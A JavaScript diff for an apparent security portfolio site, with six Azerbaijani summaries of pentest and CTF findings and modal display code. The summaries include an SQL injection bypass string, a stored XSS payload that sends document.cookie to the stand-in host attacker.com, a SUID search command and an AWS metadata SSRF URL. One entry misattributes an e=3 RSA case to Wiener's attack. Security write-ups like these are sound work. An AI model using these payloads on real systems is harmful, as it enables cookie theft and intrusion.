@@ -102,3 +102,106 @@ const obs = new IntersectionObserver((entries) => {
     });
 }, { threshold: 0.1 });
 fadeEls.forEach(el => obs.observe(el));
+
+const postData = [
+    {
+        id: '0',
+        content: `<p>Error-based SQLi texnikasından istifadə edərək login formasında autentifikasiya bypass edildi.</p>
+    <p>Payload: <code>' OR 1=1-- -</code> — server MySQL xəta mesajı qaytardı.</p>
+    <p><strong>Tövsiyə:</strong> Prepared statements istifadə edin.</p>`,
+        tags: ['SQL Injection', 'Auth Bypass', 'sqlmap', 'OWASP A03']
+    },
+    {
+        id: '1',
+        content: `<p>Profil bio sahəsinə Stored XSS payload yerləşdirildi, admin cookie oğurlandı.</p>
+    <p>Payload: <code>&lt;img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"&gt;</code></p>
+    <p><strong>Mükafat:</strong> $750 bug bounty ödənildi.</p>`,
+        tags: ['XSS', 'Session Hijacking', 'Bug Bounty', 'OWASP A07']
+    },
+    {
+        id: '2',
+        content: `<p>Nikto ilə /backup endpoint tapıldı, credentials əldə edildi.</p>
+    <p>Privesc: <code>find / -perm -4000 2>/dev/null</code> ilə SUID binary aşkarlandı.</p>
+    <p>GTFOBins üzərindən root shell alındı.</p>`,
+        tags: ['HackTheBox', 'Linux', 'SUID', 'Privilege Escalation']
+    },
+    {
+        id: '3',
+        content: `<p>API endpoint-də obyekt ID-si birbaşa URL-də göndərilirdi.</p>
+    <p>ID dəyişdirilərək başqa istifadəçinin məlumatlarına giriş əldə edildi.</p>
+    <p><strong>Fix:</strong> Server tərəfli authorization yoxlaması əlavə edilməlidir.</p>`,
+        tags: ['IDOR', 'API Security', 'Authorization', 'OWASP A01']
+    },
+    {
+        id: '4',
+        content: `<p>File upload funksiyasında URL parametri server tərəfindən fetch edilirdi.</p>
+    <p>Payload: <code>http://169.254.169.254/latest/meta-data/</code> — AWS metadata əldə edildi.</p>
+    <p><strong>Impact:</strong> IAM credentials sızdı, tam AWS girişi mümkün oldu.</p>`,
+        tags: ['SSRF', 'Cloud Security', 'AWS', 'OWASP A10']
+    },
+    {
+        id: '5',
+        content: `<p>RSA açar cütü küçük e dəyəri (e=3) ilə yaradılmışdı.</p>
+    <p>Wiener's attack ilə private key yenidən quruldu, şifrəli flag deşifrə edildi.</p>
+    <p>Tool: <code>RsaCtfTool.py --attack wiener</code></p>`,
+        tags: ['Cryptography', 'RSA', 'CTF', 'PicoCTF']
+    }
+];
+
+// Kartlara data-id əlavə et (HTML-də əlavə etmək əvəzinə JS ilə)
+document.querySelectorAll('.post-card').forEach((card, i) => {
+    card.setAttribute('data-id', i);
+    card.style.cursor = 'pointer';
+    card.addEventListener('click', () => openModal(card));
+});
+
+const overlay = document.getElementById('modalOverlay');
+const imgArea = document.getElementById('imgArea');
+const modalImg = document.getElementById('modalImg');
+const imgUpload = document.getElementById('imgUpload');
+const imgRemove = document.getElementById('imgRemove');
+
+function openModal(card) {
+    const id = card.getAttribute('data-id');
+    const data = postData[id];
+    const meta = card.querySelector('.post-meta').innerHTML;
+    const title = card.querySelector('.post-title').textContent;
+
+    document.getElementById('modalMeta').innerHTML = meta;
+    document.getElementById('modalTitle').textContent = title;
+    document.getElementById('modalContent').innerHTML = data ? data.content : '<p>Tezliklə...</p>';
+    document.getElementById('modalTags').innerHTML = data
+        ? data.tags.map(t => `<span class="modal-tag">${t}</span>`).join('')
+        : '';
+
+    modalImg.src = '';
+    imgArea.classList.remove('has-img');
+    overlay.classList.add('open');
+    document.body.style.overflow = 'hidden';
+}
+
+document.getElementById('modalClose').addEventListener('click', closeModal);
+overlay.addEventListener('click', e => { if (e.target === overlay) closeModal(); });
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+
+function closeModal() {
+    overlay.classList.remove('open');
+    document.body.style.overflow = '';
+}
+
+imgUpload.addEventListener('change', e => {
+    const file = e.target.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = ev => {
+        modalImg.src = ev.target.result;
+        imgArea.classList.add('has-img');
+    };
+    reader.readAsDataURL(file);
+});
+
+imgRemove.addEventListener('click', () => {
+    modalImg.src = '';
+    imgArea.classList.remove('has-img');
+    imgUpload.value = '';
+});
